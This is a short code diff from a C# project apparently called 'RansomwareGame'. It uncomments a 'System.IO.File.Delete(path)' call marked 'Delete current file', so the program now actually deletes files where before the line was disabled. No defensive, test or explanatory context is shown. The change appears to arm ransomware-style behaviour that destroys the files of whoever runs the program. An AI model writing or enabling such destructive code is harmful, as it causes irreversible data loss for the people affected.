@@ -79,7 +79,7 @@ namespace RansomwareGame
 
                 // Delete current file
                 var path = currentFile.path;
-                // System.IO.File.Delete(path);
+                System.IO.File.Delete(path);
 
                 nextEvent();
             }
